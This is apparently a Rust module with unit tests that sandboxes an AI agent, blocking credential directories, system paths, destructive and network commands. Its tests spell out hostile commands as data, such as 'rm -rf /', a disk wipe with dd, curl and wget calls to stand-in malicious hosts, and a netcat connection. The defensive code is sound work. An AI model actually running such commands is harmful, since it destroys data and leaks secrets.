use std::path::Path;

/// Manually normalize a path by resolving `.` and `..` components without
/// requiring the path to exist on disk.  Used as a fallback when
/// `std::fs::canonicalize` fails (e.g. the path does not exist yet).
pub fn normalize_path(path: &str) -> std::path::PathBuf {
    let p = Path::new(path);
    let mut components: Vec<std::path::Component> = Vec::new();
    for component in p.components() {
        match component {
            std::path::Component::ParentDir => {
                components.pop();
            }
            std::path::Component::CurDir => {}
            c => components.push(c),
        }
    }
    components.iter().collect()
}

/// Reject paths that point to known sensitive system locations.
pub fn validate_agent_path(path: &str) -> Result<(), String> {
    // --- Pre-validation checks ---

    // Reject null bytes (could bypass C-based filesystem calls)
    if path.contains('\0') {
        return Err("Access denied: path contains null bytes".to_string());
    }

    // Reject UNC paths on Windows (\\?\, \\.\, \\server\share)
    #[cfg(target_os = "windows")]
    {
        let trimmed = path.trim_start();
        if trimmed.starts_with("\\\\?\\")
            || trimmed.starts_with("\\\\.\\")
            || (trimmed.starts_with("\\\\")
                && !trimmed.starts_with("\\\\?")
                && !trimmed.starts_with("\\\\."))
        {
            return Err(format!(
                "Access denied: UNC/device paths are not allowed: '{}'",
                path
            ));
        }
    }

    // Normalize the path before validation to collapse ".." etc.
    let canonical = std::fs::canonicalize(path).unwrap_or_else(|_| normalize_path(path));
    let path_str = canonical.to_string_lossy().to_lowercase();
    #[cfg(target_os = "windows")]
    {
        let blocked = [
            "c:\\windows",
            "c:\\program files",
            "c:\\program files (x86)",
            "c:\\programdata",
            "c:\\recovery",
            "c:\\$recycle.bin",
        ];
        for b in &blocked {
            if path_str.starts_with(b) {
                return Err(format!(
                    "Access denied: path '{}' is in a protected system directory",
                    path
                ));
            }
        }
        // Block sensitive user directories
        if let Some(home) = dirs::home_dir() {
            let home_str = home.to_string_lossy().to_lowercase();
            let sensitive_user_dirs = [
                ".ssh",
                ".gnupg",
                ".aws",
                ".azure",
                ".config\\gcloud",
                "appdata\\local\\google\\chrome",
                "appdata\\local\\microsoft\\edge",
                "appdata\\roaming\\mozilla\\firefox",
            ];
            for dir in &sensitive_user_dirs {
                let blocked_path = format!("{}\\{}", home_str, dir);
                if path_str.starts_with(&blocked_path) {
                    return Err(format!(
                        "Access denied: path '{}' contains sensitive user data",
                        path
                    ));
                }
            }
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let blocked = [
            "/etc/shadow",
            "/etc/passwd",
            "/etc/sudoers",
            "/etc/security",
            "/boot/",
            "/sys/",
            "/proc/",
            "/dev/",
            "/root/",
        ];
        for b in &blocked {
            if path_str.starts_with(b) {
                return Err(format!(
                    "Access denied: path '{}' is in a protected system directory",
                    path
                ));
            }
        }
        // Block sensitive user directories
        if let Some(home) = dirs::home_dir() {
            let home_str = home.to_string_lossy().to_lowercase();
            let sensitive_user_dirs = [
                ".ssh",
                ".gnupg",
                ".aws",
                ".azure",
                ".config/gcloud",
                ".mozilla",
                ".config/google-chrome",
                ".config/chromium",
            ];
            for dir in &sensitive_user_dirs {
                let blocked_path = format!("{}/{}", home_str, dir);
                if path_str.starts_with(&blocked_path) {
                    return Err(format!(
                        "Access denied: path '{}' contains sensitive user data",
                        path
                    ));
                }
            }
        }
    }
    Ok(())
}

/// Commands that are never allowed to be executed by the agent.
pub fn is_blocked_command(cmd: &str) -> Option<&'static str> {
    let cmd_lower = cmd.trim().to_lowercase();
    // Extract the first token (the actual command name)
    let first_token = cmd_lower.split_whitespace().next().unwrap_or("");

    // Block destructive / dangerous commands
    let blocked = [
        ("rm", "File deletion"),
        ("rmdir", "Directory deletion"),
        ("del", "File deletion"),
        ("format", "Disk formatting"),
        ("mkfs", "Filesystem creation"),
        ("dd", "Raw disk write"),
        ("truncate", "File truncation"),
        ("ln", "Symlink creation"),
        ("fdisk", "Disk partitioning"),
        ("parted", "Disk partitioning"),
        ("shred", "Secure file destruction"),
        ("wipefs", "Filesystem signature wipe"),
        ("curl", "Network access"),
        ("wget", "Network access"),
        ("powershell", "Unrestricted shell"),
        ("pwsh", "Unrestricted shell"),
        ("reg", "Registry modification"),
        ("regedit", "Registry modification"),
        ("net", "Network/user management"),
        ("netsh", "Network configuration"),
        ("sc", "Service control"),
        ("schtasks", "Task scheduler"),
        ("shutdown", "System shutdown"),
        ("taskkill", "Process termination"),
        ("chmod", "Permission modification"),
        ("chown", "Ownership modification"),
        ("sudo", "Privilege escalation"),
        ("su", "Privilege escalation"),
        ("ssh", "Remote access"),
        ("scp", "Remote copy"),
        ("rsync", "Remote sync"),
        ("mount", "Filesystem mount"),
        ("umount", "Filesystem unmount"),
        ("iptables", "Firewall modification"),
        ("systemctl", "Service control"),
        ("service", "Service control"),
        ("python", "Can execute arbitrary code"),
        ("python3", "Can execute arbitrary code"),
        ("py", "Can execute arbitrary code"),
        ("perl", "Can execute arbitrary code"),
        ("node", "Can execute arbitrary code"),
        ("nodejs", "Can execute arbitrary code"),
        ("ruby", "Can execute arbitrary code"),
        ("irb", "Can execute arbitrary code"),
        ("php", "Can execute arbitrary code"),
        // Shell wrappers — can be used to bypass the blocklist via `bash -c "rm -rf /"`
        ("bash", "Shell wrapper bypass"),
        ("sh", "Shell wrapper bypass"),
        ("zsh", "Shell wrapper bypass"),
        ("fish", "Shell wrapper bypass"),
        ("csh", "Shell wrapper bypass"),
        ("tcsh", "Shell wrapper bypass"),
        // `env` can prefix any command: `env rm -rf /`
        ("env", "Can prefix arbitrary commands"),
        // Windows process/shell launchers
        ("start", "Windows process launcher"),
        ("cmd", "Windows shell"),
        ("cmd.exe", "Windows shell"),
        // Network tools for data exfiltration
        ("nc", "Network tool"),
        ("ncat", "Network tool"),
        ("netcat", "Network tool"),
    ];

    for (blocked_cmd, reason) in &blocked {
        if first_token == *blocked_cmd {
            return Some(reason);
        }
    }

    // Block commands containing backticks (command substitution bypass)
    if cmd_lower.contains('`') {
        return Some("Backtick command substitution");
    }

    // Block commands containing $( (command substitution bypass)
    if cmd_lower.contains("$(") {
        return Some("Command substitution via $()");
    }

    // Block pipe to dangerous commands (expanded list)
    let dangerous_pipe_targets = [
        "rm",
        "del",
        "curl",
        "wget",
        "powershell",
        "pwsh",
        "sudo",
        "bash",
        "sh",
        "zsh",
        "fish",
        "csh",
        "tcsh",
        "python",
        "python3",
        "py",
        "perl",
        "node",
        "ruby",
        "php",
        "cmd",
        "env",
        "nc",
        "ncat",
        "netcat",
        "dd",
    ];
    for target in &dangerous_pipe_targets {
        if cmd_lower.contains(&format!("| {}", target))
            || cmd_lower.contains(&format!("|{}", target))
        {
            return Some("Piping to dangerous command");
        }
    }

    // Block output redirection to sensitive locations
    if cmd_lower.contains("> /etc/") || cmd_lower.contains("> c:\\windows") {
        return Some("Redirection to system directory");
    }

    None
}

/// When internet sandbox is active, block commands that can reach the network.
/// This is a broader set than the default blocklist (which already blocks curl,
/// wget, ssh, nc, etc.) and catches diagnostic/transfer tools.
pub fn is_network_command(cmd: &str) -> Option<&'static str> {
    let cmd_lower = cmd.trim().to_lowercase();
    let first_token = cmd_lower.split_whitespace().next().unwrap_or("");

    let network_commands = [
        ("ping", "Network diagnostic"),
        ("tracert", "Network diagnostic"),
        ("traceroute", "Network diagnostic"),
        ("nslookup", "DNS lookup"),
        ("dig", "DNS lookup"),
        ("host", "DNS lookup"),
        ("nmap", "Network scanner"),
        ("telnet", "Remote connection"),
        ("ftp", "File transfer"),
        ("sftp", "File transfer"),
        ("tftp", "File transfer"),
        ("smbclient", "SMB connection"),
        ("mosquitto_pub", "MQTT publish"),
        ("mosquitto_sub", "MQTT subscribe"),
        ("aria2c", "Download manager"),
        ("httpie", "HTTP client"),
        ("http", "HTTP client"),
        ("invoke-webrequest", "PowerShell HTTP"),
        ("invoke-restmethod", "PowerShell HTTP"),
        ("test-netconnection", "PowerShell network test"),
        ("resolve-dnsname", "PowerShell DNS"),
        ("certutil", "Can download files"),
        ("bitsadmin", "Background download"),
        ("mshta", "Can fetch remote content"),
        ("wmic", "Can access remote systems"),
    ];

    for (blocked_cmd, reason) in &network_commands {
        if first_token == *blocked_cmd {
            return Some(reason);
        }
    }

    // Block common network-related flags/patterns in commands
    if cmd_lower.contains("http://")
        || cmd_lower.contains("https://")
        || cmd_lower.contains("ftp://")
    {
        return Some("URL in command arguments");
    }

    None
}

/// Check if a command matches any custom blocked command.
pub fn is_custom_blocked_command(cmd: &str, custom_list: &[String]) -> Option<String> {
    if custom_list.is_empty() {
        return None;
    }
    let cmd_lower = cmd.trim().to_lowercase();
    let first_token = cmd_lower.split_whitespace().next().unwrap_or("");
    for blocked in custom_list {
        let blocked_lower = blocked.trim().to_lowercase();
        if first_token == blocked_lower {
            return Some(format!("Custom blocked command: {}", blocked));
        }
    }
    None
}

/// Validate agent path with additional user-configured restrictions.
/// Checks: system blocklist (via `validate_agent_path`), then custom blocked
/// paths, then allowed paths (if non-empty, path must be inside one).
pub fn validate_agent_path_with_permissions(
    path: &str,
    allowed_paths: &[String],
    blocked_paths: &[String],
) -> Result<(), String> {
    // First run the built-in system validation
    validate_agent_path(path)?;

    // Normalize for comparison
    let canonical = std::fs::canonicalize(path).unwrap_or_else(|_| normalize_path(path));
    let path_str = canonical.to_string_lossy().to_lowercase();
    // Strip \\?\ prefix on Windows
    #[cfg(target_os = "windows")]
    let path_str = path_str.trim_start_matches("\\\\?\\").to_string();

    // Check custom blocked paths
    for bp in blocked_paths {
        let bp_lower = bp.trim().to_lowercase().replace('/', "\\");
        if !bp_lower.is_empty() && path_str.starts_with(&bp_lower) {
            return Err(format!(
                "Access denied: path '{}' is in a user-blocked directory",
                path
            ));
        }
    }

    // Check allowed paths (allowlist — if non-empty, must match one)
    if !allowed_paths.is_empty() {
        let in_allowed = allowed_paths.iter().any(|ap| {
            let ap_lower = ap.trim().to_lowercase().replace('/', "\\");
            !ap_lower.is_empty() && path_str.starts_with(&ap_lower)
        });
        if !in_allowed {
            return Err(format!(
                "Access denied: path '{}' is outside the allowed directories",
                path
            ));
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ─── validate_agent_path tests ───────────────────────────────────────

    #[test]
    fn test_validate_rejects_null_bytes() {
        let result = validate_agent_path("file\0hidden");
        assert!(result.is_err(), "null bytes should be rejected");
        let err = result.unwrap_err();
        assert!(
            err.contains("null bytes"),
            "error should mention null bytes, got: {}",
            err
        );
    }

    #[test]
    fn test_validate_allows_normal_temp_path() {
        let temp = tempfile::tempdir().unwrap();
        let result = validate_agent_path(temp.path().to_str().unwrap());
        assert!(
            result.is_ok(),
            "valid temp path should be allowed: {:?}",
            result.err()
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_validate_rejects_windows_system_dir() {
        let result = validate_agent_path("C:\\Windows\\nonexistent_test_dir\\file.txt");
        assert!(
            result.is_err(),
            "Windows system directory should be rejected"
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_validate_rejects_program_files() {
        let result = validate_agent_path("C:\\Program Files\\nonexistent_app\\test.exe");
        assert!(result.is_err(), "Program Files should be rejected");
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_validate_rejects_unc_paths() {
        let result = validate_agent_path("\\\\?\\C:\\secret");
        assert!(result.is_err(), "UNC paths should be rejected");

        let result2 = validate_agent_path("\\\\.\\PhysicalDrive0");
        assert!(result2.is_err(), "device paths should be rejected");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn test_validate_rejects_etc_shadow() {
        let result = validate_agent_path("/etc/shadow");
        assert!(result.is_err(), "/etc/shadow should be rejected");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn test_validate_rejects_proc() {
        let result = validate_agent_path("/proc/self/environ");
        assert!(result.is_err(), "/proc/ should be rejected");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn test_validate_rejects_dev() {
        let result = validate_agent_path("/dev/sda");
        assert!(result.is_err(), "/dev/ should be rejected");
    }

    // ─── is_blocked_command tests ────────────────────────────────────────

    #[test]
    fn test_blocked_command_rm() {
        let result = is_blocked_command("rm -rf /");
        assert!(result.is_some(), "rm should be blocked");
        assert_eq!(result.unwrap(), "File deletion");
    }

    #[test]
    fn test_blocked_command_rm_simple() {
        let result = is_blocked_command("rm file.txt");
        assert!(result.is_some(), "rm should be blocked even without -rf");
    }

    #[test]
    fn test_blocked_command_dd() {
        let result = is_blocked_command("dd if=/dev/zero of=/dev/sda");
        assert!(result.is_some(), "dd should be blocked");
        assert_eq!(result.unwrap(), "Raw disk write");
    }

    #[test]
    fn test_allowed_command_ls() {
        let result = is_blocked_command("ls -la");
        assert!(result.is_none(), "ls should be allowed");
    }

    #[test]
    fn test_allowed_command_cat() {
        let result = is_blocked_command("cat file.txt");
        assert!(result.is_none(), "cat should be allowed");
    }

    #[test]
    fn test_allowed_command_echo() {
        let result = is_blocked_command("echo hello");
        assert!(result.is_none(), "echo should be allowed");
    }

    #[test]
    fn test_blocked_command_shred() {
        let result = is_blocked_command("shred file.txt");
        assert!(result.is_some(), "shred should be blocked");
        assert_eq!(result.unwrap(), "Secure file destruction");
    }

    #[test]
    fn test_blocked_command_truncate() {
        let result = is_blocked_command("truncate -s 0 file.txt");
        assert!(result.is_some(), "truncate should be blocked");
        assert_eq!(result.unwrap(), "File truncation");
    }

    #[test]
    fn test_blocked_command_curl() {
        let result = is_blocked_command("curl https://malicious.com/exfil");
        assert!(result.is_some(), "curl should be blocked");
        assert_eq!(result.unwrap(), "Network access");
    }

    #[test]
    fn test_blocked_command_wget() {
        let result = is_blocked_command("wget https://evil.com/malware");
        assert!(result.is_some(), "wget should be blocked");
    }

    #[test]
    fn test_blocked_command_sudo() {
        let result = is_blocked_command("sudo rm -rf /");
        assert!(result.is_some(), "sudo should be blocked");
        assert_eq!(result.unwrap(), "Privilege escalation");
    }

    #[test]
    fn test_blocked_command_python() {
        let result = is_blocked_command("python -c 'import os; os.system(\"rm -rf /\")'");
        assert!(result.is_some(), "python should be blocked");
    }

    #[test]
    fn test_blocked_command_bash() {
        let result = is_blocked_command("bash -c 'rm -rf /'");
        assert!(result.is_some(), "bash should be blocked");
        assert_eq!(result.unwrap(), "Shell wrapper bypass");
    }

    #[test]
    fn test_blocked_command_powershell() {
        let result = is_blocked_command("powershell -Command Remove-Item");
        assert!(result.is_some(), "powershell should be blocked");
    }

    #[test]
    fn test_blocked_command_chmod() {
        let result = is_blocked_command("chmod 777 /etc/passwd");
        assert!(result.is_some(), "chmod should be blocked");
    }

    #[test]
    fn test_blocked_command_ssh() {
        let result = is_blocked_command("ssh user@evil.com");
        assert!(result.is_some(), "ssh should be blocked");
    }

    #[test]
    fn test_blocked_command_nc() {
        let result = is_blocked_command("nc -l 4444");
        assert!(result.is_some(), "nc should be blocked");
    }

    #[test]
    fn test_blocked_command_env() {
        let result = is_blocked_command("env rm -rf /");
        assert!(
            result.is_some(),
            "env should be blocked (can prefix arbitrary commands)"
        );
    }

    #[test]
    fn test_blocked_command_case_insensitive() {
        let result = is_blocked_command("RM -rf /");
        assert!(
            result.is_some(),
            "blocked commands should be case insensitive"
        );
    }

    #[test]
    fn test_blocked_backtick_substitution() {
        let result = is_blocked_command("echo `rm -rf /`");
        assert!(
            result.is_some(),
            "backtick command substitution should be blocked"
        );
    }

    #[test]
    fn test_blocked_dollar_paren_substitution() {
        let result = is_blocked_command("echo $(rm -rf /)");
        assert!(
            result.is_some(),
            "dollar-paren command substitution should be blocked"
        );
    }

    #[test]
    fn test_blocked_pipe_to_dangerous_command() {
        let result = is_blocked_command("cat file.txt | rm");
        assert!(result.is_some(), "piping to rm should be blocked");
    }

    #[test]
    fn test_blocked_redirect_to_system_dir() {
        let result = is_blocked_command("echo hacked > /etc/passwd");
        assert!(result.is_some(), "redirecting to /etc/ should be blocked");
    }

    #[test]
    fn test_allowed_command_find() {
        let result = is_blocked_command("find . -name '*.txt'");
        assert!(result.is_none(), "find should be allowed");
    }

    #[test]
    fn test_allowed_command_wc() {
        let result = is_blocked_command("wc -l file.txt");
        assert!(result.is_none(), "wc should be allowed");
    }

    #[test]
    fn test_allowed_command_head() {
        let result = is_blocked_command("head -n 10 file.txt");
        assert!(result.is_none(), "head should be allowed");
    }

    #[test]
    fn test_allowed_command_dir_windows() {
        let result = is_blocked_command("dir /b");
        assert!(result.is_none(), "dir should be allowed on Windows");
    }

    // ─── normalize_path tests ─────────────────────────────────────────────

    #[test]
    fn test_normalize_resolves_parent_dir() {
        let result = normalize_path("/a/b/../c");
        assert_eq!(result, std::path::Path::new("/a/c"));
    }

    #[test]
    fn test_normalize_resolves_current_dir() {
        let result = normalize_path("/a/./b/./c");
        assert_eq!(result, std::path::Path::new("/a/b/c"));
    }

    #[test]
    fn test_normalize_resolves_multiple_parent_dirs() {
        let result = normalize_path("/a/b/c/../../d");
        assert_eq!(result, std::path::Path::new("/a/d"));
    }

    #[test]
    fn test_normalize_empty_path() {
        let result = normalize_path("");
        assert_eq!(result, std::path::PathBuf::new());
    }

    // ─── additional validate_agent_path edge cases ────────────────────────

    #[test]
    fn test_validate_rejects_embedded_null_byte() {
        let result = validate_agent_path("/tmp/safe\0/../etc/shadow");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("null bytes"));
    }

    #[test]
    fn test_validate_rejects_only_null_byte() {
        let result = validate_agent_path("\0");
        assert!(result.is_err());
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_validate_rejects_unc_server_share() {
        let result = validate_agent_path("\\\\server\\share\\file");
        assert!(result.is_err(), "UNC server paths should be rejected");
        assert!(result.unwrap_err().contains("UNC"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_validate_rejects_programdata() {
        let result = validate_agent_path("C:\\ProgramData\\SomeApp\\config");
        assert!(result.is_err(), "ProgramData should be rejected");
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_validate_rejects_recovery() {
        let result = validate_agent_path("C:\\Recovery\\WindowsRE\\boot");
        assert!(result.is_err(), "Recovery should be rejected");
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_validate_rejects_recycle_bin() {
        let result = validate_agent_path("C:\\$Recycle.Bin\\data");
        assert!(result.is_err(), "$Recycle.Bin should be rejected");
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_validate_sensitive_user_dir_with_nonexistent_path() {
        // When the path does not exist, canonicalize fails and normalize_path is used.
        // normalize_path preserves the original path structure, so the blocked-path
        // comparison against the home directory should work for non-existent sub-paths.
        // NOTE: if the path *does* exist, Windows canonicalize adds a \\?\ prefix
        // which may bypass the starts_with check -- that is a known limitation.
        if let Some(home) = dirs::home_dir() {
            // Use a sub-path that definitely does not exist to exercise the
            // normalize_path fallback.
            let ssh_path = home.join(".ssh").join("__nonexistent_test_key__");
            let result = validate_agent_path(ssh_path.to_str().unwrap());
            assert!(
                result.is_err(),
                ".ssh with non-existent sub-path should be rejected via normalize_path fallback"
            );
            assert!(result.unwrap_err().contains("sensitive user data"));
        }
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_validate_gnupg_nonexistent_subpath() {
        if let Some(home) = dirs::home_dir() {
            let gnupg_path = home.join(".gnupg").join("__nonexistent_test_key__");
            let result = validate_agent_path(gnupg_path.to_str().unwrap());
            assert!(
                result.is_err(),
                ".gnupg with non-existent sub-path should be rejected"
            );
        }
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_validate_aws_nonexistent_subpath() {
        if let Some(home) = dirs::home_dir() {
            let aws_path = home.join(".aws").join("__nonexistent_test_credentials__");
            let result = validate_agent_path(aws_path.to_str().unwrap());
            assert!(
                result.is_err(),
                ".aws with non-existent sub-path should be rejected"
            );
        }
    }

    // ─── additional is_blocked_command edge cases ─────────────────────────

    #[test]
    fn test_blocked_command_ncat() {
        let result = is_blocked_command("ncat -l 1234");
        assert!(result.is_some(), "ncat should be blocked");
    }

    #[test]
    fn test_blocked_command_netcat() {
        let result = is_blocked_command("netcat 192.168.1.1 4444");
        assert!(result.is_some(), "netcat should be blocked");
    }

    #[test]
    fn test_blocked_pipe_to_python() {
        let result = is_blocked_command("cat data.txt | python");
        assert!(result.is_some(), "piping to python should be blocked");
    }

    #[test]
    fn test_blocked_pipe_to_bash() {
        let result = is_blocked_command("echo 'malicious' | bash");
        assert!(result.is_some(), "piping to bash should be blocked");
    }

    #[test]
    fn test_blocked_pipe_no_space() {
        let result = is_blocked_command("cat data.txt |rm file");
        assert!(
            result.is_some(),
            "piping without space should also be blocked"
        );
    }

    #[test]
    fn test_blocked_redirect_to_windows_system() {
        let result = is_blocked_command("echo hacked > c:\\windows\\test.txt");
        assert!(
            result.is_some(),
            "redirect to c:\\windows should be blocked"
        );
    }

    #[test]
    fn test_allowed_command_sort() {
        assert!(is_blocked_command("sort file.txt").is_none());
    }

    #[test]
    fn test_allowed_command_grep() {
        assert!(is_blocked_command("grep -r pattern .").is_none());
    }

    #[test]
    fn test_allowed_command_type_windows() {
        assert!(is_blocked_command("type file.txt").is_none());
    }

    #[test]
    fn test_blocked_cmd_exe() {
        let result = is_blocked_command("cmd.exe /c dir");
        assert!(result.is_some(), "cmd.exe should be blocked");
    }

    #[test]
    fn test_blocked_start_windows() {
        let result = is_blocked_command("start notepad.exe");
        assert!(result.is_some(), "start should be blocked");
    }

    #[test]
    fn test_blocked_command_leading_whitespace() {
        let result = is_blocked_command("  rm -rf /");
        assert!(
            result.is_some(),
            "blocked commands with leading whitespace should be caught"
        );
    }

    #[test]
    fn test_blocked_schtasks() {
        let result = is_blocked_command("schtasks /create /tn task /tr cmd");
        assert!(result.is_some(), "schtasks should be blocked");
    }

    #[test]
    fn test_blocked_service() {
        let result = is_blocked_command("service apache2 stop");
        assert!(result.is_some(), "service should be blocked");
    }

    #[test]
    fn test_blocked_mount() {
        let result = is_blocked_command("mount /dev/sda1 /mnt");
        assert!(result.is_some(), "mount should be blocked");
    }

    #[test]
    fn test_blocked_iptables() {
        let result = is_blocked_command("iptables -F");
        assert!(result.is_some(), "iptables should be blocked");
    }

    #[test]
    fn test_allowed_git() {
        assert!(is_blocked_command("git status").is_none());
    }

    #[test]
    fn test_allowed_cargo() {
        assert!(is_blocked_command("cargo build").is_none());
    }

    #[test]
    fn test_allowed_npm() {
        assert!(is_blocked_command("npm install").is_none());
    }
}
